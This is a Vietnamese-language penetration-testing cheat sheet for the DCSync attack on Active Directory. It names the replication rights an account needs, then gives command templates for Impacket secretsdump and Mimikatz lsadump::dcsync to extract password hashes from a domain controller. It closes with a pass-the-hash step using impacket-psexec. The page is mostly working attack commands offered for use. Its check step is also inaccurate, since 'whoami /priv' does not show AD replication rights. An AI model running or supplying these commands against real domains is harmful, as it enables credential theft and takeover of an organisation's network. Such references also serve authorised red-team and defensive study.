# DCSync

## Điểm chính khai thác

* Lỗ hổng: Giao thức Directory Replication Service (DRS) không kiểm tra xem yêu cầu sao chép có đến từ Domain Controller (DC) đáng tin cậy, chỉ xác minh quyền của SID.
* Tác động: Trích xuất hash mật khẩu (NTDS.dit) của bất kỳ tài khoản nào trong domain.
* Điều kiện khai thác:
  * Tài khoản có quyền:
    * Replicating Directory Changes (GetChanges).
    * Replicating Directory Changes All (GetChangesAll) – cần để lấy hash.
    * Replicating Directory Changes in Filtered Set (GetChangesInFilteredSet) – để lấy thông tin bị ẩn.
  * Theo mặc định, các nhóm Domain Admins, Enterprise Admins, Administrators có quyền này.
  * Kết nối đến DC qua giao thức DRS.

## Kiểm tra lỗ hổng

### Kiểm tra quyền của tài khoản

Xác minh tài khoản có quyền cần thiết (GetChanges, GetChangesAll):

```
whoami /priv
```

### Kiểm tra kết nối đến DC

Xác định Domain Controller (DC) có thể truy cập:

```
nltest /dclist:<domain>
```

## Tấn công từ xa

### Thu thập hash với Impacket

Sử dụng Impacket để giả mạo DC và trích xuất hash từ NTDS.dit:

```
impacket-secretsdump -just-dc-user <target_user> <domain>/<user>:<pass>@<dc_ip>
```

## Tấn công nội bộ

### Thu thập hash với Mimikatz

Sử dụng Mimikatz từ máy trong domain để trích xuất hash:

```
mimikatz "lsadump::dcsync /domain:<domain> /user:<domain>\<target_user>" exit
```

## Kiểm tra kết quả

### Lệnh

Kiểm tra hash đã trích xuất (thực hiện trong quá trình tấn công):

```
impacket-secretsdump -just-dc-user <target_user> <domain>/<user>:<pass>@<dc_ip>
```

### Xác nhận

Sử dụng hash để tiếp tục khai thác (ví dụ: Pass-the-Hash):

```
impacket-psexec <domain>/<target_user>@<dc_ip> -hashes <lm_hash>:<nt_hash>
```